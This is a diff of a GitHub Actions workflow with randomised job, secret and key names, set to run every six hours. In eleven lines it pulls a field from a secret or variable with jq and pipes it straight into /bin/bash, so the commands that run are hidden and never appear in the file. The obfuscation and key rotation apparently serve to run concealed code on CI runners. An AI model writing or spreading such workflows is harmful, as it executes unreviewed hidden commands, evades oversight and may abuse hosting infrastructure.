@@ -1,27 +1,28 @@
 name: luazhen1876
+
 on:
   workflow_dispatch:
   schedule:
-    - cron: '59 1/6 * * *'
+    - cron: '46 3/6 * * *'
+
 jobs:
   build:
     runs-on: ubuntu-latest
-
     steps:
       - uses: actions/checkout@v4
       - name: luazhen1876
         env:
-          tig6471: ${{ secrets.tig6471 }}
+          z3: ${{ secrets.z3 }}
         run: |
-          echo $tig6471 | jq -r .dt36628 | /bin/bash
-          echo $yzn9 | jq -r .kaoq5 | /bin/bash
-          echo $t093 | jq -r .wbglt6465 | /bin/bash
-          echo $gmxut415 | jq -r .csgbk806 | /bin/bash
-          echo $lbeha1 | jq -r .dzvs795 | /bin/bash
-          echo $yfw7 | jq -r .kcu0 | /bin/bash
-          echo $gvjjt4 | jq -r .jqwjv945 | /bin/bash
-          echo $jswpb02550 | jq -r .ost74 | /bin/bash
-          echo $rn149 | jq -r .kx3195 | /bin/bash
-          echo $snpux801 | jq -r .gwwwf8031 | /bin/bash
-          echo $sscp36 | jq -r .ukrjk30253 | /bin/bash
+          echo $z3 | jq -r .eepy807 | /bin/bash
+          echo $xtay2 | jq -r .jmobj095 | /bin/bash
+          echo $uo9 | jq -r .yz23981 | /bin/bash
+          echo $lgy97 | jq -r .qs2727 | /bin/bash
+          echo $ux91 | jq -r .m1803 | /bin/bash
+          echo $ygusm32048 | jq -r .l33398 | /bin/bash
+          echo $cqxua287 | jq -r .lwtxy5 | /bin/bash
+          echo $puuam8990 | jq -r .m725 | /bin/bash
+          echo $ebbt9 | jq -r .gs88 | /bin/bash
+          echo $axata993 | jq -r .g6278 | /bin/bash
+          echo $twuk03858 | jq -r .hu66704 | /bin/bash
 
